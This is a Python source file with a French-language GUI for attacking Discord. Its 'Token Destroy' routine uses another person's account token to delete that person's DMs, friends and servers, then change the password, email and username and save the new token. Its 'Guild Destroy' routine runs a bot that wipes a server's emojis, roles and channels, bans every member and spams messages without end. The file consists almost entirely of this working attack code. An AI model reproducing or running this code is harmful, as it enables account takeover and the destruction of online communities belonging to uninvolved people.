import requests
import PySimpleGUI as sg
import base64
import discord
from discord.ext import commands
from PIL import Image
from io import BytesIO

layout = [
    [sg.Button("Token Destroy", size=(35, 1)), sg.Button("Spammer Webhook", size=(35, 1))],
    [sg.Button("Guild Destroy", size=(35, 1)), sg.Button("Give Admin Perm", size=(35, 1))],
]

window = sg.Window("Tool Discord", layout=layout)

while True:
    event, values = window.Read()
    if event is None or event == 'Exit':
        break
    elif event == "Token Destroy":
        layout3 = [
            [sg.Text("Token à détruire", size=(20, 1)), sg.Input(size=(28, 1), key="token")],
            [sg.Text("MDP du compte", size=(20, 1)), sg.Input(size=(28, 1), key="password")],
            [sg.Text("Nouveau pseudo du compte", size=(20, 1)), sg.Input(size=(28, 1), key="new_username")],
            [sg.Text("Nouvel email du compte", size=(20, 1)), sg.Input(size=(28, 1), key="new_email")],
            [sg.Text("Nouveau MDP du compte", size=(20, 1)), sg.Input(size=(28, 1), key="new_password")],
            [sg.Text("Nouvel avatar du compte", size=(20, 1)), sg.InputText(size=(14, 1), key="new_avatar"), sg.FileBrowse(file_types=(("Images", "*.jpg"), ("Images", "*.jpeg"), ("Images", "*.png"), ("Images", "*.gif")), size=(10,1), key="icon_browse")],
            [sg.Text("Mot de passe", size=(16, 1)), sg.Checkbox('', default=False, key="check_have_password",  tooltip="Si vous avez le mot de passe du compte, cochez la case"), sg.Text("Changement mot de passe", size=(20, 1)), sg.Checkbox('', default=False, key="check_change_password", tooltip="Change le mot de passe du compte")],
            [sg.Text("Changement pseudo", size=(16, 1)), sg.Checkbox('', default=False, key="check_change_username",  tooltip="Change le pseudo du compte"), sg.Text("Changement email", size=(20, 1)), sg.Checkbox('', default=False, key="check_change_email", tooltip="Change l'email du compte")],
            [sg.Text("Changement avatar", size=(16, 1)), sg.Checkbox('', default=True, key="check_change_avatar",  tooltip="Change la photo de profil du compte")],
            [sg.Button("Lancer l'attaque", size=(48, 1))]
        ]
        window3 = sg.Window("Token Destroy", layout=layout3)
        while True:
            event3, values3 = window3.Read(timeout=0)
            if event3 is None:
                break
            elif event3 == sg.TIMEOUT_KEY:
                if not values3['check_have_password']:
                    window3['password'].Update(disabled=True)
                    window3['check_change_password'].Update(disabled=True)
                    window3['check_change_username'].Update(disabled=True)
                    window3['check_change_email'].Update(disabled=True)
                else:
                    window3['password'].Update(disabled=False)
                    window3['check_change_password'].Update(disabled=False)
                    window3['check_change_username'].Update(disabled=False)
                    window3['check_change_email'].Update(disabled=False)
                if not values3['check_change_password']:
                    window3['new_password'].Update(disabled=True)
                else:
                    if values3['check_have_password'] == True:
                        window3['new_password'].Update(disabled=False)
                if not values3['check_change_username']:
                    window3['new_username'].Update(disabled=True)
                else:
                    if values3['check_have_password'] == True:
                        window3['new_username'].Update(disabled=False)
                if not values3['check_change_email']:
                    window3['new_email'].Update(disabled=True)
                else:
                    if values3['check_have_password'] == True:
                        window3['new_email'].Update(disabled=False)
                if not values3['check_change_avatar']:
                    window3['new_avatar'].Update(disabled=True)
                    window3['icon_browse'].Update(disabled=True)
                else:
                    window3['new_avatar'].Update(disabled=False)
                    window3['icon_browse'].Update(disabled=False)
                window.Refresh()
            elif event3 == "Lancer l'attaque":
                if values3['token'] == "":
                    sg.PopupNonBlocking("Le token à détruire doit être spécifié", title="Error")
                    continue
                elif values3['check_have_password'] == False and values3['new_username'] != "":
                    sg.PopupNonBlocking("Le changement de pseudo ne peut pas se faire sans le mot de passe.", title="Error")
                    continue
                elif values3['check_have_password'] == False and values3['new_email'] != "":
                    sg.PopupNonBlocking("Le changement d'email ne peut pas se faire sans le mot de passe.", title="Error")
                    continue
                elif values3['check_have_password'] == False and values3['new_password'] != "":
                    sg.PopupNonBlocking("Le changement de mot de passe ne peut pas se faire sans le mot de passe.", title="Error")
                    continue
                elif values3['password'] == "" and values3['check_have_password'] == True:
                    sg.PopupNonBlocking("Le mot de passe du compte doit être spécifié", title="Error")
                    continue
                elif values3['new_username'] == "" and values3['check_change_username'] == True:
                    sg.PopupNonBlocking("Le nouveau pseudo du compte doit être spécifié", title="Error")
                    continue
                elif len(values3['new_password']) < 6:
                    sg.PopupNonBlocking("Le nouveau mot de passe du compte doit contenir plus de 6 caractères.", title="Error")
                    continue
                request_check = requests.get("https://discord.com/api/v8/users/@me", headers={"authorization": values3['token']})
                if request_check.status_code != 200:
                    sg.PopupNonBlocking("Le token spécifié est invalide", title="Error")
                    continue
                try:
                    with open(values3['new_avatar'], 'rb') as file:
                        data = base64.b64encode(file.read()).decode('utf-8')
                    im = Image.open(BytesIO(base64.b64decode(data)))
                    im.save('new_avatar.png', 'PNG')
                    with open('new_avatar.png', 'rb') as file:
                        base64_avatar = f"data:image/png;base64,{base64.b64encode(file.read()).decode('utf-8')}"
                except:
                    base64_avatar = False
                request_channel = requests.get("https://discord.com/api/v8/users/@me/channels", headers={"authorization": values3['token']})
                for channel in request_channel.json():
                    requests.delete(f"https://discord.com/api/v8/channels/{int(channel['id'])}", headers={"authorization": values3['token']})
                request_friend = requests.get("https://discord.com/api/v8/users/@me/relationships", headers={"authorization": values3['token']})
                for friend in request_friend.json():
                    requests.delete(f"https://discord.com/api/v8/users/@me/relationships/{int(friend['id'])}", headers={"authorization": values3['token']})
                request_guild = requests.get("https://discord.com/api/v8/users/@me/guilds", headers={"authorization": values3['token']})
                for guild in request_guild.json():
                    requests.delete(f"https://discord.com/api/v8/users/@me/guilds/{int(guild['id'])}", headers={"authorization": values3['token']})
                for guild_owner in request_guild.json():
                    requests.post(f"https://discord.com/api/v8/guilds/{int(guild['id'])}/delete", headers={"authorization": values3['token']})
                request_guild_owner = requests.get("https://discord.com/api/v8/users/@me/guilds", headers={"authorization": values3['token']})
                if values3['check_change_avatar'] == True:
                    json_avatar = {
                        "avatar": base64_avatar
                    }
                    r = requests.patch("https://discord.com/api/v8/users/@me", headers={"authorization": values3['token']}, json=json_avatar)
                if values3['check_change_username'] == True:
                    json_username = {
                                "username": values3['new_username'],
                                "password": values3['password']
                            }
                    r = requests.patch("https://discord.com/api/v8/users/@me", headers={"authorization": values3['token']}, json=json_username)
                    if "PASSWORD_DOES_NOT_MATCH" in r.text:
                        sg.PopupNonBlocking("Le mot de passe spécifié est incorrect.", title="Error")
                        continue
                if values3['check_change_email'] == True:
                    json_email = {
                                "email": values3['new_email'],
                                "password": values3['password']
                            }
                    r = requests.patch("https://discord.com/api/v8/users/@me", headers={"authorization": values3['token']}, json=json_email)
                    if "PASSWORD_DOES_NOT_MATCH" in r.text:
                        sg.PopupNonBlocking("Le mot de passe spécifié est incorrect.", title="Error")
                        continue
                    elif "EMAIL_TYPE_INVALID_EMAIL" in r.text:
                        sg.PopupNonBlocking("L'email spécifié est invalide.", title="Error")
                if values3['check_change_password'] == True:
                    json_password = {
                                "password": values3['password'],
                                "new_password": values3['new_password']
                            }
                    r = requests.patch("https://discord.com/api/v8/users/@me", headers={"authorization": values3['token']}, json=json_password)
                    if "PASSWORD_DOES_NOT_MATCH" in r.text:
                        sg.PopupNonBlocking("Le mot de passe spécifié est incorrect.", title="Error")
                        continue
                    elif  "PASSWORD_BAD_PASSWORD" in r.text:
                        sg.PopupNonBlocking("Le nouveau mot de passe spécifié est trop faible.", title="Error")
                        continue
                    print(r.text)
                    with open(f"new_token_{r.json()['username']}.txt", "w") as file:
                        file.write(f"Nouvel email : {values3['new_email']}\nNouveau mot de passe : {values3['new_password']}\nNouveau token : {r.json()['token']}")
                    sg.PopupNonBlocking(f"""Le mot de passe a été modifié. (Le token a été modifié avec et le nouveau token du compte se trouve dans un fichier texte nommé 'new_token_{r.json()["username"]}.txt'""", title="Success")
                    os.remove("new_avatar.png")

    elif event == "Guild Destroy":
        layout2 = [
            [sg.Text("Token du bot", size=(20, 1)), sg.Input(size=(20, 1), key="token")],
            [sg.Text("ID du serveur", size=(20, 1)), sg.Input(size=(20, 1), key="guild_id")],
            [sg.Text("Nom des rôles à créer", size=(20, 1)), sg.Input(size=(20, 1), key="role_name")],
            [sg.Text("Nombre de rôles à créer", size=(20, 1)), sg.Spin([i for i in range(0, 100)], initial_value=1, key="role_amount")],
            [sg.Text("Nom des salons à créer", size=(20, 1)), sg.Input(size=(20, 1), key="channel_name")],
            [sg.Text("Nombre de salons à créer", size=(20, 1)), sg.Spin([i for i in range(0, 500)], initial_value=1, key="channel_amount")],
            [sg.Text("Message à spammer", size=(20, 1)), sg.Input(size=(20, 1), key="message")],
            [sg.Text("Créations de rôles", size=(14, 1)), sg.Checkbox('', default=True, key="check_role",  tooltip="Crée des rôles sur un serveur"), sg.Text("Créations de salons", size=(15, 1)), sg.Checkbox('', default=True, key="check_channel", tooltip="Crée des salons sur un serveur")],
            [sg.Text("Ban All", size=(14, 1)), sg.Checkbox('', default=True, key="check_banall", tooltip="Ban tous les membres d'un serveur (FLAG PAR DISCORD POSSIBLE)")],
            [sg.Button("Lancer l'attaque", size=(40, 1))]
        ]
        window2 = sg.Window("Guild Destroy", layout=layout2)
        while True:
            event2, values2 = window2.Read(timeout=0)
            if event2 is None:
                break
            elif event2 == sg.TIMEOUT_KEY:
                if not values2['check_role']:
                    window2['role_amount'].Update(disabled=True)
                    window2['role_name'].Update(disabled=True)
                else:
                    window2['role_amount'].Update(disabled=False)
                    window2['role_name'].Update(disabled=False)
                if not values2['check_channel']:
                    window2['channel_amount'].Update(disabled=True)
                    window2['channel_name'].Update(disabled=True)
                    window2['message'].Update(disabled=True)
                else:
                    window2['channel_amount'].Update(disabled=False)
                    window2['channel_name'].Update(disabled=False)
                    window2['message'].Update(disabled=False)
                window2.Refresh()
            elif event2 == "Lancer l'attaque":
                if values2['token'] == "":
                    sg.PopupNonBlocking("Un token doit être spécifié.")
                    continue
                elif values2['guild_id'] == "":
                    sg.PopupNonBlocking("Un ID de serveur doit être spécifié.")
                    continue
                elif values2['role_amount'] == "" and values2['check_role'] == True:
                    sg.PopupNonBlocking("Le nombre de rôles qui vont être créés doit être spécifié.")
                    continue
                elif values2['role_name'] == "" and values2['check_role'] == True:
                    sg.PopupNonBlocking("Le nom des rôles qui vont être créés doit être spécifié.")
                    continue
                elif values2['channel_amount'] == "" and values2['check_channel'] == True:
                    sg.PopupNonBlocking("Le nombre de salons qui vont être créés doit être spécifié.")
                    continue
                elif values2['channel_name'] == "" and values2['check_channel'] == True:
                    sg.PopupNonBlocking("Le nom des salons qui vont être créés doit être spécifié.")
                    continue
                intents = discord.Intents.default()
                intents.members = True
                bot = commands.Bot(command_prefix="?????", help_command=None, intents=intents)
                @bot.event
                async def on_ready():
                    sg.PopupNonBlocking("L'attaque commence...", title="Success")
                    guild = bot.get_guild(int(values2['guild_id']))
                    for emoji in guild.emojis:
                        try:
                            await emoji.delete()
                        except:
                            pass
                    for role in guild.roles:
                        try:
                            await role.delete()
                        except:
                            pass
                    for channel in guild.channels:
                        try:
                            await channel.delete()
                        except:
                            pass
                    sg.PopupNonBlocking("Tous les emojis, salons et rôles ont été supprimés.", title="Success")
                    if values2['check_role'] == True:
                        for i in range(int(values2['role_amount'])):
                            await guild.create_role(name=values2['role_name'])
                    if values2['check_channel'] == True:
                        for i in range(int(values2['channel_amount'])):
                            await guild.create_text_channel(name=values2['channel_name'])
                    if values2['check_banall'] == True:
                        for member in guild.members:
                            try:
                                await member.ban(reason="Guild Destroyed")
                                await asyncio.sleep(1)
                            except:
                                pass
                    await guild.edit(name="Guild Destroyed")
                    async def spam_channels(channel):
                        try:
                                await channel.send(values2['message'])
                        except:
                            pass
                    if values2['check_channel'] == True:
                        while True:
                            for channel in guild.channels:
                                await spam_channels(channel)
                                await spam_channels(channel)
                                await spam_channels(channel)
                            for channel in guild.channels:
                                await spam_channels(channel)
                                await spam_channels(channel)
                                await spam_channels(channel)
                            for channel in guild.channels:
                                await spam_channels(channel)
                                await spam_channels(channel)
                                await spam_channels(channel)
                                
                try:
                    bot.run(values2['token'])
                except:
                    sg.PopupNonBlocking("Le token spécifié est invalide.")
